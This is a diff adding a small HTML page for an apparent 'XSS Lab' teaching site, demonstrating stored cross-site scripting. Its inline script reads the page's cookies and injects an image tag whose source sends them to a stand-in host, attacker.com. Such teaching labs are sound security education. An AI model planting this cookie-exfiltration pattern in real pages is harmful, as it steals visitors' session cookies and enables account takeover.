@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XSS Lab</title>
+</head>
+<body>
+  <nav>
+    <strong>XSS Lab</strong>
+    |
+    <a href="/">Reflected XSS</a>
+    |
+    <a href="/stored.html">Stored XSS</a>
+  </nav>
+  <h1>Stored XSS</h1>
+  <p id="jar"></p>
+  <article>
+    <h2>Example post</h2>
+    <div id="post"></div>
+  </article>
+  <script>
+    const cookies = document.cookie;
+    document.getElementById('jar').textContent = 'Site cookies: ' + cookies;
+    const url = 'https://attacker.com/?in=' + encodeURIComponent(cookies);
+    document.getElementById('post').innerHTML = '<p>Example post</p><img alt="" src="' + url + '">';
+  </script>
+</body>
+</html>
